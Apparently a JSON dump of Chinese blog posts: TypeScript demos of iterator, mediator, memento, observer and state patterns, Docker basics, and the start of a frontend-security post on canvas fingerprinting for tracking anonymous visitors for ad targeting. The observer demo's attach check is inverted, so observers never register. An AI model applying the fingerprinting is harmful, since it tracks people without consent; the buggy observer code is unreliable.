根据特定应用定制的算法加入泛型集合类造成不必要的内存开销 客户端不得不关心当前集合类是否能够进行某些元素访问方式，使得代码与特定集合耦合。 迭代器模式就是为了解决这一问题而生。迭代器模式的主要思想是将集合的遍历行为抽取为单独的迭代器对象。 迭代器类主要包含以下内容： 实现自身迭代算法 封装遍历操作的所有细节 获取集合元素的基本方法 另外我们需要实现一个迭代器接口，来保证迭代器方法一致。迭代器模式类图如下： 迭代器模式类图 迭代器Iterator: 迭代器接口，声明了遍历集合所需要的操作，例如获取下一个元素、获取当前位置、重新开始迭代 具体迭代器ConcreteIterator: 实现遍历集合的一种算法。迭代器对象必须追踪自身遍历的进度。这使得多个迭代器可以相互独立地遍历同一集合 集合Collection: 集合接口，声明一个或多个方法来获取与集合兼容的迭代器。方法返回的类型必须为迭代器接口，因此具体集合可以返回各种不同的迭代器 具体集合ConcreteCollection: 实现集合接口中的方法，为客户端返回一个特定的具体迭代器对象。 客户端Client: 客户端通常不会执行创建迭代器，而是从集合中获取。但特定情况下，例如当客户端要自定义特殊迭代器，客户端可以直接创建一个迭代器。 下面我们尝试为一个字符串集合构建迭代器： 迭代器接口：需要支持获取当前元素、获取下一元素、获取当前元素key值、检测当前指针位置是否合法、重置指针的操作 集合接口：需要一个工厂方法，支持构建集合对应的迭代器 具体集合：试用一个数组作为底层数据结构，同时需要支持获取数组，获取长度、添加元素、获取迭代器、获取方向迭代器的功能 具体迭代器：需要保存可迭代对象的引用，当前位置的属性，以及遍历方向标志位。 点击查看代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124// TODO: 迭代器接口interface MyIterator&lt;T&gt; &#123; // 获取当前元素 getCurrent(): T; // 返回当前元素并将指针移动到下一元素 getNext(): T; // 返回当前预算的key getCurrentKey(): number; // 检测当前位置是否有效 checkValid(): boolean; // 将迭代器指针指向第一个元素 rewind(): void;&#125;// TODO: 集合接口，定义获得迭代器的方法interface Aggregator &#123; getIterator(): MyIterator&lt;string&gt;;&#125;// TODO: 具体集合类class WordsCollection implements Aggregator &#123; private items: string[] = []; // 获得集合 public getItems(): string[] &#123; return this.items; &#125; // 获得长度 public getCount(): number &#123; return this.items.length; &#125; public addItem(item: string) &#123; this.items.push(item); &#125; // 获得迭代器 public getIterator(): MyIterator&lt;string&gt; &#123; return new AlphabeticalOrderIterator(this); &#125; // 获得方向迭代器 public getReverseIterator(): MyIterator&lt;string&gt; &#123; return new AlphabeticalOrderIterator(this, true); &#125;&#125;// TODO: 具体迭代器类class AlphabeticalOrderIterator implements MyIterator&lt;string&gt; &#123; private collection: WordsCollection; private position: number = 0; // 遍历方向 private reverse: boolean = false; constructor(collection: WordsCollection, reverse: boolean = false) &#123; this.collection = collection; this.reverse = reverse; if (reverse) &#123; this.position = collection.getCount() - 1; &#125; &#125; public rewind() &#123; this.position = this.reverse ? this.collection.getCount() - 1 : 0; &#125; public getCurrent(): string &#123; return this.collection.getItems()[this.position]; &#125; public getCurrentKey(): number &#123; return this.position; &#125; public getNext(): string &#123; const item = this.collection.getItems()[this.position]; this.position += this.reverse ? -1 : 1; return item; &#125; public checkValid(): boolean &#123; return this.reverse ? this.position &gt;= 0 : this.position &lt; this.collection.getCount(); &#125;&#125;const collection = new WordsCollection();collection.addItem(&quot;first&quot;);collection.addItem(&quot;second&quot;);collection.addItem(&quot;third&quot;);const iterator = collection.getIterator();console.log(&quot;Straight traversal:&quot;);while (iterator.checkValid()) &#123; console.log(iterator.getNext());&#125;console.log(&quot;&quot;);console.log(&quot;Reverse traversal:&quot;);const reverseIterator = collection.getReverseIterator();while (reverseIterator.checkValid()) &#123; console.log(reverseIterator.getNext());&#125;/** * Straight traversal: * first * second * third * * Reverse traversal: * third * second * first */ 应用场景 当集合背后为复杂的数据结构，且你希望对客户端隐藏其复杂性时（出于使用便利性或安全性的考虑），可以使用迭代器模式。 使用该模式可以减少程序中重复的遍历代码。 如果希望代码能够遍历不同的甚至是无法预知的数据结构，可以使用迭代器模式。 优点 符合单一责任原则。将遍历算法抽离为独立的类 符合开闭原则。无需修改代码，就能创建新的集合与迭代器 可以并行遍历同一集合，因为迭代器对象都包含其自身的遍历状态。 可以暂停遍历，并在需要时继续 缺点 如果程序只与简单的集合进行交互，应用该模式可能会矫枉过正。 对于某些特殊集合，使用迭代器可能比直接遍历的效率低。 Combo 可以使用迭代器模式来遍历组合模式树。 可以同时使用工厂方法模式和迭代器来让子类集合返回不同类型的迭代器， 并使得迭代器与集合相匹配。 可以同时使用备忘录模式和迭代器来获取当前迭代器的状态， 并且在需要的时候进行回滚。 可以同时使用访问者模式和迭代器来遍历复杂数据结构，并对其中的元素执行所需操作，即使这些元素所属的类完全不同。 解释器模式Interpreter Pattern 给分析对象定义一个语言，并定义该语言的文法表示，再设计一个解析器来解释语言中的句子。也就是说，用编译语言的方式来分析应用中的实例。这种模式实现了文法表达式处理的接口，该接口解释一个特定的上下文。 中介模式 中介模式是一种行为设计模式，他能减少对象之间混乱无序的依赖关系。通过限制对象之间的直接交互，强迫他们通过一个中介对象进行合作 中介模式建议我们停止组件之间的直接交流，使其相互独立，这样就不会出现一个组件与多个其他组件相互耦合的情况，一个组件只会依赖于一个中介类。中介模式类图如下 中介模式类图 组件Component: 包含业务逻辑的类，依赖于一个中介对象，保存其引用。组件无需知道中介对象的具体类，只需要知道其实现了中介接口既可以，这样便于连接不同中介类，并在程序中复用 中介接口Mediator: 声明了中介与组件交流的方法，通常包含一个通知方法，以上下文作为参数，将接收组件与发送组件解耦 具体中介ConcreteMediator: 封装组件间的关系，保存所有组件的引用并对其进行管理，甚至可以管理其生命周期 对于组件而言，中介者是一个黑箱，组件并不知道其发送的消息将由谁来处理，也不会知道是谁给它发送了消息。 下面我们来写一个Demo感受一下中介模式，我们需要以下接口： 中介接口: 声明一个消息提醒接口，它接收一个参数sender代表发送信息的组件，一个上下文信息event，这里用string简单演示 组件基类: 为了确保组件均通过中介对象发送请求，我们需要为每个组件实现一个基类，使这个基类保存中介对象的引用。 实际组件类: 依赖于组件基类，实现一些具体的业务逻辑方法。 实际中介类: 实际中介类需要保存所有组件对象的引用，另外还需要实现接口中的通知方法，该方法会根据不同的上下文，调用不同的组件对象的逻辑方法。 点击查看代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116// TODO: 中介接口interface Mediator &#123; /** * notify * @param: * sender: object * event: string * @returns: * void */ notify(sender: object, event: string): void;&#125;// TODO: 实现组件基类class BaseComponent &#123; // TODO: 组件需要保存中介对象 protected mediator: Mediator; constructor(mediator?: Mediator) &#123; this.mediator = mediator!; &#125; public setMediator(mediator: Mediator) &#123; this.mediator = mediator; &#125;&#125;// TODO: 实际组件class Component1 extends BaseComponent &#123; constructor(mediator?: Mediator) &#123; super(mediator); &#125; // TODO: 一些业务逻辑 public doSomeA(): void &#123; console.log(&quot;Component 1 does A.&quot;); this.mediator.notify(this, &quot;A&quot;); &#125; public doSomeB(): void &#123; console.log(&quot;Component 1 does B.&quot;); this.mediator.notify(this, &quot;B&quot;); &#125;&#125;// TODO: 实际组件class Component2 extends BaseComponent &#123; constructor(mediator?: Mediator) &#123; super(mediator); &#125; // 一些业务逻辑 public doSomeC(): void &#123; console.log(&quot;Component 2 does C.&quot;); this.mediator.notify(this, &quot;C&quot;); &#125; public doSomeD(): void &#123; console.log(&quot;Component 2 does D.&quot;); this.mediator.notify(this, &quot;D&quot;); &#125;&#125;// TODO: 实际中介类class ConcreteMediator implements Mediator &#123; // TODO: 保存所有组件 private component1: Component1; private component2: Component2; constructor(component1: Component1, component2: Component2) &#123; this.component1 = component1; this.component1.setMediator(this); this.component2 = component2; this.component2.setMediator(this); &#125; // TODO: 实现通知接口，根据事件名称执行不同的业务，sender用于保存信息发送者 notify(sender: object, event: string): void &#123; if (event === &quot;A&quot;) &#123; console.log( &quot;Mediator reacts on A and triggers following operations:&quot; ); this.component2.doSomeC(); &#125; if (event === &quot;D&quot;) &#123; console.log( &quot;Mediator reacts on D and triggers following operations:&quot; ); this.component1.doSomeB(); this.component2.doSomeC(); &#125; &#125;&#125;const c1 = new Component1();const c2 = new Component2();const mediator = new ConcreteMediator(c1, c2);console.log(&quot;Client triggers operation A.&quot;);c1.doSomeA();console.log(&quot;&quot;);console.log(&quot;Client triggers operation D.&quot;);c2.doSomeD();// Client triggers operation A.// Component 1 does A.// Mediator reacts on A and triggers following operations:// Component 2 does C.// Client triggers operation D.// Component 2 does D.// Mediator reacts on D and triggers following operations:// Component 1 does B.// Component 2 does C. 使用场景 当一些对象与其他对象紧密耦合以至于难以对其进行修改时，可以使用中介模式 当组件因过于依赖于其他组件而无法在不同应用中复用时，可以使用中介模式 如果为了能在不同场景下复用一些基本行为，导致不得不创建大量组件子类时，可以使用中介模式 优点 符合单一责任原则，将多个组件间的交流抽取到同一位置，使其便于理解与维护 符合开闭原则，无需修改实际组件就能增加新的中介者 缓解应用中的耦合情况 更方便地复用组件 缺点 一段时间后中介者可能变为上帝对象 Combo 责任链模式、命令模式、中介者模式和观察者模式都是用于处理请求发送者和接收者之间的不同连接方式： 责任链按照顺序将请求传递给潜在接收者。直到有一名处理 命令在发送者和接收者之间建立单向连接🔗 中介者消除了发送者和接收者之间的直接连接🔗，强制他们与一个中介对象进行沟通 观察者允许接收者动态地订阅或取消接收请求 外观模式和中介模式的职责类似: 它们都尝试在大量紧密耦合的类中组织起合作。 外观为子系统中的所有对象定义了一个简单接口， 但是它不提供任何新功能。子系统本身不会意识到外观的存在。子系统中的对象可以直接进行交流。 中介者将系统中组件的沟通行为中心化。各组件只知道中介者对象，无法直接相互交流。 中介者和观察者大部分情况下只能使用其中一种模式，但有时可以同时使用: 中介者的主要目标是消除一系列系统组件之间的相互依赖。观察者的目标是在对象之间建立动态的单向连接，使得部分对象可作为其他对象的附属发挥作用。 而有一种流行的中介模式融合了二者：中介者对象担当发布者的角色，其他组件则作为订阅者 备忘录模式 备忘录模式是一种行为设计模式，允许在不暴露对象实现细节的情况下保存和恢复对象之前的状态。 我们先来思考以下场景： 我们想要设计一个文字编辑器app，需要支持撤销操作 这意味着用户每次进行操作时，需要将操作之前的所有对象的状态进行保存 但这也意味着，负责记录的类要访问所有需要被记录的所有成员。 这就意味着：要么会暴露类的所有内部细节而使其过于脆弱；要么会限制对其状态的访问权限而无法生成快照。 而备忘录模式为我们提供了解决办法： 备忘录模式类图 原发射器Originator: 备忘录将创建快照的工作委托给实际状态拥有者，称为原发射器对象，拥有对备忘录所有成员的访问权限，可以保存自身状态的快照，也能在需要时通过快照恢复自身状态。 备忘录Memento: 备忘录模式建议将对象状态存储在备忘录对象中。除了创建备忘录的对象可以访问其内容，其余对象均不可访问其中的内容。其他对象必须使用受限接口与备忘录进行交互，它们可以获取快照的元数据（创建时间和操作名称等），但不能获取快照中原始对象的状态。 负责人Caretakers: 备忘录将被保存在负责人对象中，负责人对象仅通过受限接口访问备忘录，因此无法对其进行修改。 备忘录模式具体有三种主流结构，下面我们来一一介绍 基于嵌套实现 基于嵌套实现的备忘录模式 在这一方法中备忘录类将被嵌套在原发射器中 这样原发射器可以访问备忘录的所有成员变量和方法 负责人对备忘录的访问权限非常有限，只能在栈中保存备忘录，而无法修改其状态 负责人通过备忘录栈来保存历史状态，当原发送者需要回溯时，负责人从栈顶取出备忘录，传递给原发射器来恢复状态 基于中间接口实现 基于中间接口实现的备忘录模式 适用于不支持嵌套类的语言（比如PHP） 通过接口，规定负责人只能通过固定接口与备忘录进行交互，限制负责人对备忘录成员的直接访问 原发射器可以直接与备忘录对象交互，访问备忘录中的成员与方法 缺点是需要将备忘录中的所有成员变量声明为公有 点击查看代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144// 原发射器class Originator &#123; private state: string; constructor(state: string) &#123; this.state = state; &#125; // 模拟业务 doSomething(): void &#123; console.log(&quot;Originator: I&#x27;m doing something important.&quot;); this.state = this.generateRandomString(30); console.log(`Originator: and my state has changed to: $&#123;this.state&#125;`); &#125; // 产生随机字符串 generateRandomString(length: number = 10) &#123; const charSet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; return Array.apply(null, &#123; length &#125;) .map(() =&gt; charSet.charAt(Math.floor(Math.random() * charSet.length)) ) .join(&quot;&quot;); &#125; // 保存快照 public save(): Memento &#123; return new ConcreteMemento(this.state); &#125; // 恢复状态 public restore(m: Memento) &#123; this.state = m.getState(); console.log(`Originator: My state has changed to: $&#123;this.state&#125;`); &#125;&#125;// 备忘录接口interface Memento &#123; getState(): string; getName(): string; getDate(): string;&#125;// 实际备忘录class ConcreteMemento implements Memento &#123; // 快照 private state: string; // 保存时间 private date: string; constructor(state: string) &#123; this.state = state; this.date = new Date().toISOString().slice(0, 19).replace(&quot;T&quot;, &quot; &quot;); &#125; public getState(): string &#123; return this.state; &#125; public getName(): string &#123; return `$&#123;this.date&#125; / ($&#123;this.state.slice(0, 9)&#125;...)`; &#125; public getDate(): string &#123; return this.date; &#125;&#125;// 负责人class Caretaker &#123; private mementos: Memento[] = []; private originator: Originator; constructor(originator: Originator) &#123; this.originator = originator; &#125; // 备份时创建新的备忘录 public backup(): void &#123; console.log(&quot;\\nCaretaker: Saving Originator&#x27;s state...&quot;); this.mementos.push(this.originator.save()); &#125; // 撤销时取出栈定备忘 public undo(): void &#123; if (!this.mementos.length) &#123; return; &#125; const memento = this.mementos.pop() as Memento; console.log(`Caretaker: Restoring state to: $&#123;memento.getName()&#125;`); this.originator.restore(memento); &#125; // 查看保存历史 public showHistory(): void &#123; console.log(&quot;Caretaker: Here&#x27;s the list of mementos:&quot;); for (const memento of this.mementos) &#123; console.log(memento.getName()); &#125; &#125;&#125;// 客户端代码const originator = new Originator(&quot;Super-duper-super-puper-super.&quot;);const caretaker = new Caretaker(originator);caretaker.backup();originator.doSomething();caretaker.backup();originator.doSomething();console.log(&quot;&quot;);caretaker.showHistory();console.log(&quot;\\nClient: Now, let&#x27;s rollback!\\n&quot;);caretaker.undo();console.log(&quot;\\nClient: Once more!\\n&quot;);caretaker.undo();// Caretaker: Saving Originator&#x27;s state...// Originator: I&#x27;m doing something important.// Originator: and my state has changed to: jeSdYDdKubiayBMNwGKzkmVeloqZUz// Caretaker: Saving Originator&#x27;s state...// Originator: I&#x27;m doing something important.// Originator: and my state has changed to: JrMFnUuPEBgdTGNzBaeduRDUHlrmax// Caretaker: Here&#x27;s the list of mementos:// 2024-06-28 10:59:37 / (Super-dup...)// 2024-06-28 10:59:37 / (jeSdYDdKu...)// Client: Now, let&#x27;s rollback!// Caretaker: Restoring state to: 2024-06-28 10:59:37 / (jeSdYDdKu...)// Originator: My state has changed to: jeSdYDdKubiayBMNwGKzkmVeloqZUz// Client: Once more!// Caretaker: Restoring state to: 2024-06-28 10:59:37 / (Super-dup...)// Originator: My state has changed to: Super-duper-super-puper-super. 更为严格的实现 更为严格的实现 不会让其他类有任何机会访问原发射器状态。 允许存在多种不同形式的原始发射器，每种发射器与其相应的备忘录进行交互，原发射器和备忘录不会暴露任何状态。 负责人禁止修改存储在备忘录中的状态，负责人独立于原发射器存在，因此恢复方法被保存在了备忘录中。 每个备忘录与创建了自身的原发射器连接，原发射器将自身状态传递给备忘录的构造函数，这样只需要原发射器定义了合适的设置器(setter)，备忘录就能恢复原本状态。 试用场景 当需要创建对象状态快照来恢复其之前的状态时，可以使用备忘录模式。 当直接访问对象的成员变量、获取器或设置器将导致封装被突破时，可以使用该模式。 备忘录让对象自行负责创建其状态的快照。任何其他对象都不能读取快照，这有效地保障了数据的安全性。 优点 可以在不破坏对象封装情况的前提下创建对象状态快照。 可以通过让负责人维护原发器状态历史记录来简化原发器代码。 缺点 如果客户端过于频繁地创建备忘录，程序将消耗大量内存。 负责人必须完整跟踪原发器的生命周期，这样才能销毁弃用的备忘录。 绝大部分动态编程语言（例如 PHP、Python 和 JavaScript）不能确保备忘录中的状态不被修改。 Combo 可以同时使用命令模式和备忘录模式来实现 “撤销”。在这种情况下，命令用于对目标对象执行各种不同的操作，备忘录用来保存一条命令执行前该对象的状态。 你可以同时使用备忘录和迭代器模式来获取当前迭代器的状态，并且在需要的时候进行回滚。 有时候原型模式可以作为备忘录的一个简化版本，其条件是需要在历史记录中存储的对象的状态比较简单，不需要链接其他外部资源，或者链接可以方便地重建。 观察者设计模式（事件订阅者） 观察者模式是一种行为设计模式，允许你定义一种订阅机制，可在对象事件发生时通知多个观察该对象的其他对象 订阅这模式脱胎于一个很日常的问题： 某个商店将要上一批产品，但目前并不知道具体的开售时间。 部分顾客对该产品感兴趣，但部分用户不感兴趣 那么如果我们不采用任何措施，也许对产品感兴趣的顾客，可能得连续几天都到店询问是否到货。 商店还能采取一种措施：到货了之后，向所有注册用户发送邮件。 第一种方案会造成不必要的时间浪费，也很大程度上会导致顾客错过商品；第二种方案，对产品不感兴趣的用户也会受到邮件，这将造成不必要的骚扰。 于是观察者模式应运而生。 商店可以先对顾客收集意向，当产品到货之后，只向有意向的顾客发送邮件。这就避免了时间的浪费，以及不必要的骚扰。 观察者模式类图如下： 观察者模式类图 发布者Publisher: 会向其他对象发送事件通知。包含一个加入订阅和离开订阅的框架。事件会在发布者自身状态改变或执行特定行为后发生。 当新事件发生时，发送者会遍历订阅列表，并调用每个订阅这的更新方法。 订阅者Subscriber: 订阅这接口，声明了通知接口。在绝大多数情况下包含一个update更新方法。该方法可以拥有多个参数，使发布者能在更新时传递时间的详细信息 具体订阅者ConcreteSubscribers: 可以执行一些操作来回应发布者的通知。所有具体订阅者类都实现了同样的接口，以达到将发布者与具体的类解耦的目的。 订阅者通常需要一些上下文信息来正确处理更新。硬吃发布者会将上下文传递给更新方法，发布者甚至可以将自身作为参数传递给更新方法，使订阅者直接获取所需的数据。 我们熟知的Vue中，数据双向绑定就是使用观察者模式实现的。下面我们也来简单的实现一下观察者模式： 首先我们需要一个发布者接口，它定义了一个普通对象要被当做发布者应该具有的方法： 增加订阅 删除订阅 通知订阅者 随后我们实现一个带有状态的类，然后让他实现发布者接口，成为发布者，此外他需要一个可以修改自身状态的业务方法 其次我们需要一个订阅者接口，它定义了一个普通对象成为订阅者需要实现的方法： 更新函数（副作用函数） 最后我们实现一个类，然后让他实现订阅者接口，称为订阅者 点击查看代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107// TODO: 发布者接口，定义收集，分发，通知方法interface Publisher &#123; attach(observer: Observer): void; detach(observer: Observer): void; notify(): void;&#125;// TODO: 观察者接口，定义更新方法（副作用函数）interface Observer &#123; update(publish: Publisher): void;&#125;class ConcretePublisher implements Publisher &#123; // 发布者具有的状态 public state: number; // 收集订阅者 private observers: Observer[]; constructor(state: number) &#123; this.state = state; this.observers = []; &#125; // 增加 public attach(observer: Observer): void &#123; const isExit = this.observers.indexOf(observer) === -1; if (isExit) return console.log( &quot;Publisher: Observer has been attached already.&quot; ); console.log(&quot;Publisher: Attached an observer.&quot;); this.observers.push(observer); &#125; // 删除 public detach(observer: Observer): void &#123; const observerIndex = this.observers.indexOf(observer); if (observerIndex === -1) return console.log(&quot;Publisher: Nonexistent observer.&quot;); this.observers.splice(observerIndex, 1); console.log(&quot;Publisher: Detached an observer.&quot;); &#125; // 通知 public notify(): void &#123; console.log(&quot;Publisher: Notifying observers...&quot;); for (const observer of this.observers) &#123; observer.update(this); &#125; &#125; // TODO: 模拟业务逻辑改变发布者的状态 public doSomething(): void &#123; console.log(&quot;\\nPublisher: I&#x27;m doing something important.&quot;); this.state = Math.floor(Math.random() * (10 + 1)); console.log(`Publisher: My state has just changed to: $&#123;this.state&#125;`); this.notify(); &#125;&#125;class ConcreteObserverA implements Observer &#123; public update(publish: Publisher): void &#123; if (publish instanceof ConcretePublisher &amp;&amp; publish.state &lt; 3) &#123; console.log(&quot;ConcreteObserverA: Reacted to the event.&quot;); &#125; &#125;&#125;class ConcreteObserverB implements Observer &#123; public update(publish: Publisher): void &#123; if (publish instanceof ConcretePublisher &amp;&amp; publish.state &lt; 3) &#123; console.log(&quot;ConcreteObserverB: Reacted to the event.&quot;); &#125; &#125;&#125;const publisher = new ConcretePublisher(3);const observer1 = new ConcreteObserverA();publisher.attach(observer1);const observer2 = new ConcreteObserverB();publisher.attach(observer2);publisher.doSomething();publisher.doSomething();publisher.detach(observer2);publisher.doSomething();// Publisher: Observer has been attached already.// Publisher: Observer has been attached already.// Publisher: I&#x27;m doing something important.// Publisher: My state has just changed to: 8// Publisher: Notifying observers...// Publisher: I&#x27;m doing something important.// Publisher: My state has just changed to: 5// Publisher: Notifying observers...// Publisher: Nonexistent observer.// Publisher: I&#x27;m doing something important.// Publisher: My state has just changed to: 3// Publisher: Notifying observers... 适用场景 当一个对象状态的改变需要改变其他对象，或实际对象是事先未知的或动态变化的时，可使用观察者模式。 后者的一个例子是：你创建了自定义按钮类并允许客户端在按钮中注入自定义代码，这样当用户按下按钮时就会触发这些代码。 当应用中的一些对象必须观察其他对象时，可使用该模式。但仅能在有限时间内或特定情况下使用。 优点 符合开闭原则。无需修改发布者代码就能引入新的订阅者类 （如果是发布者接口则可轻松引入发布者类）。 可以在运行时建立对象之间的联系。 缺点 订阅者的通知顺序是随机的。 Combo 责任链模式、命令模式、中介者模式和观察者模式用于处理请求发送者和接收者之间的不同连接方式。 中介者和观察者之间的区别往往很难记住。在大部分情况下，可以使用其中一种模式，而有时可以同时使用。 状态模式 状态模式是一种行为设计模式，让你能在一个对象的内部状态变化时改变其行为，使其看上去就像改变了自身所属的类一样。 状态模式实际上与**有限状态机**这一概念息息相关。JS种的Promise就是一个具有四种状态的有限状态机。这里不做展开。我们通过下面的例子来感受一下： 我们需要实现一个文档类 文档类可能处于三种状态： 草稿 审核中 已发布 文档类需要包含一个publish发布方法，但该方法在不同的状态时逻辑不同： 处于草稿状态时，调用publish，文档变为审核中状态 处于审核中状态时，调用publish，会进行身份认证，若为管理员者将文档变为发布状态 处于发布状态时，调用publish，不会进行任何操作 上述文档类就能看作一个三个状态的有限状态机。因此我们简单概括一下就能得到有限状态机的定义： 程序在任意时刻处于几种有限的状态中，在任何状态下程序的行为并不相同，并且可瞬间从一个状态变换到另一个，或保持不变。这种状态切换称为转移 接下来我们在回到上面的例子，如果我们想要实现这一案例，我能该怎么做？ 最简单的方法一定是通过if...else或者switch等条件运算符实现。但当我们逐步在文档类中添加更多状态和依赖于状态的行为后，大部分方法中将会包含复杂的条件语句。修改其转换逻辑可能会涉及到修改所有方法中的状态条件语句，导致代码维护困难。 状态模式建议为对象的所有可能状态新建一个类， 然后将所有状态的对应行为抽取到这些类中。 状态模式类图 上下文Context: 有限状态机本身，包含一个对当前状态对象的引用，将与当前状态相关的工作委派给状态对象，并提供一个改变当前状态对象的接口。 状态State: 状态接口，声明特定于这一状态的方法。 具体状态ConcreteStates: 实现特定于状态的方法。为了避免多个状态中包含相似代码，可以提供一个封装有部分通用行为的中间抽象类。状态对象可存储对于上下文对象的反向引用。状态可以通过该引用从上下文处获取所需信息，并且能触发状态转移。 上下文和具体状态都可以设置上下文的下个状态，并可通过替换连接到上下文的状态对象来完成实际的状态转换。 根据上述类图我们可以尝试实现一个状态模式Demo： 点击查看代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// TODO: 状态接口abstract class State &#123; protected context: Context; public setContext(context: Context) &#123; this.context = context; &#125; public abstract handle1(): void; public abstract handle2(): void;&#125;// TODO: 上下文class Context &#123; private state: State; constructor(state: State) &#123; this.transitionTo(state); &#125; // 状态转移 public transitionTo(state: State) &#123; console.log(`Context: Transition to $&#123;(&lt;any&gt;state).constructor.name&#125;.`); this.state = state; this.state.setContext(this); &#125; // 业务1 public request1(): void &#123; this.state.handle1(); &#125; // 业务2 public request2(): void &#123; this.state.handle2(); &#125;&#125;// TODO: 具体状态class ConcreteStateA extends State &#123; public handle1(): void &#123; console.log(&quot;ConcreteStateA handles request1.&quot;); console.log(&quot;ConcreteStateA wants to change the state of the context.&quot;); // 转移到下一状态 this.context.transitionTo(new ConcreteStateB()); &#125; public handle2(): void &#123; console.log(&quot;ConcreteStateA handles request2.&quot;); &#125;&#125;class ConcreteStateB extends State &#123; public handle1(): void &#123; console.log(&quot;ConcreteStateB handles request1.&quot;); &#125; public handle2(): void &#123; console.log(&quot;ConcreteStateB handles request2.&quot;); console.log(&quot;ConcreteStateB wants to change the state of the context.&quot;); // 转移到下一状态 this.context.transitionTo(new ConcreteStateA()); &#125;&#125;const context = new Context(new ConcreteStateA());context.request1();context.request2();// Context: Transition to ConcreteStateA.// ConcreteStateA handles request1.// ConcreteStateA wants to change the state of the context.// Context: Transition to ConcreteStateB.// ConcreteStateB handles request2.// ConcreteStateB wants to change the state of the context.// Context: Transition to ConcreteStateA. 试用场景 如果对象需要根据自身当前状态进行不同行为，同时状态的数量非常多且与状态相关的代码会频繁变更的话，可使用状态模式。 如果某个类需要根据成员变量的当前值改变自身行为，从而需要使用大量的条件语句时，可使用该模式。 当相似状态和基于条件的状态机转换中存在许多重复代码时，可使用状态模式。 优点 符合单一职责原则。将与特定状态相关的代码放在单独的类中。 符合开闭原则。无需修改已有状态类和上下文就能引入新状态。 通过消除臃肿的状态机条件语句简化上下文代码。 缺点 如果状态机只有很少的几个状态，或者很少发生改变，那么应用该模式可能会显得小题大作。 Combo 桥接模式、状态模式和策略模式（在某种程度上包括适配器模式）模式的接口非常相似。实际上，它们都基于组合模式——即将工作委派给其他对象， 不过也各自解决了不同的问题。 状态可被视为策略的扩展。两者都基于组合机制： 它们都通过将部分工作委派给 “帮手” 对象来改变其在不同情景下的行为。 策略使得这些对象相互之间完全独立，它们不知道其他对象的存在。 状态模式没有限制具体状态之间的依赖，且允许它们自行改变在不同情景下的状态。 策略模式","categories":[{"name":"前端","slug":"前端","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"设计模式","slug":"前端/设计模式","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"设计模式","slug":"设计模式","permalink":"http://enderxiao.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"前端","slug":"前端","permalink":"http://enderxiao.github.io/tags/%E5%89%8D%E7%AB%AF/"},{"name":"JS","slug":"JS","permalink":"http://enderxiao.github.io/tags/JS/"}]},{"title":"docker学习","slug":"docker学习","date":"2024-04-01T07:33:10.000Z","updated":"2024-07-30T11:26:33.916Z","comments":true,"path":"2024/04/01/docker学习/","permalink":"http://enderxiao.github.io/2024/04/01/docker%E5%AD%A6%E4%B9%A0/","excerpt":"docker学习","text":"docker学习 Docker解决的问题 部署流程反锁 环境不一致（开发、测试、预发布、线上） 资源隔离问题 交付流程复杂 Docker 核心概念 Docker(Moby)诞生于2013年，Docker公司后来分化为了两个版本Mobdy(Docker CE)和Docker(Docker EE) 容器 用于运行一个软件的容器，容器中包含了软件运行所需要的一系列依赖 容器引擎 Docker是一个容器引擎，用来管理容器的生命周期 镜像 容器的安装包，包含容器中需要的内容以及对应的配置信息。因此要运行一个容器必须先有一个镜像 （镜像）仓库 用于存放各个镜像，对镜像进行统一管理 容器的作用 运行在不同环境的软件（如是用不同Java版本的软件）可以通过装在不同的容器中实现资源隔离 不进行资源隔离时，软件之间可能由于资源竞争，导致其中一个软件占据了所有资源，而另一个无法被分配资源。 在没有容器的时代，通常是用虚拟机的形式对资源进行隔离 提供了一个标准化的方式 容器VS虚拟机 使用虚拟机实现资源隔离需要安装额外的操作系统，这将导致不必要的资源浪费。 当服务掉线需要重启时，虚拟机需要进行操作系统的重启，再实现服务的重启，效率相比于容器更低。 容器的隔离方案不如操作系统的隔离彻底。 容器即为一个“轻量级的虚拟机”","categories":[{"name":"容器","slug":"容器","permalink":"http://enderxiao.github.io/categories/%E5%AE%B9%E5%99%A8/"},{"name":"docker","slug":"容器/docker","permalink":"http://enderxiao.github.io/categories/%E5%AE%B9%E5%99%A8/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://enderxiao.github.io/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://enderxiao.github.io/tags/%E5%AE%B9%E5%99%A8/"}]},{"title":"前端网络安全学习","slug":"前端网络安全学习","date":"2024-01-22T08:21:39.000Z","updated":"2024-07-30T11:26:33.926Z","comments":true,"path":"2024/01/22/前端网络安全学习/","permalink":"http://enderxiao.github.io/2024/01/22/%E5%89%8D%E7%AB%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/","excerpt":"收集一些前端会用到的网络安全技术","text":"收集一些前端会用到的网络安全技术 Canvas指纹 技术场景：Canvas指纹追踪技术，当我没没有登录，但是进入某网站查看了图片，网站想要追踪到这一条浏览记录向目标推荐广告时该怎么办 而canvas指纹常被用来讲图片转化为Base64，只需要在canvas中绘制图片然后调用toDataURL()即可，这一方法在转Base64时底层会获取：设备、操作系统、浏览器版本三个信息一同加入到编码中，而这三者完全一致的概率很低，因此可以使用这一方式生成用户ID以此进行广告推送。 12345678const uuid = () =&gt; &#123; const canvas = document.createElement(&#x27;canvas&#x27;); const ctx = canvas.getContext(&#x27;2d&#x27;); const txt = 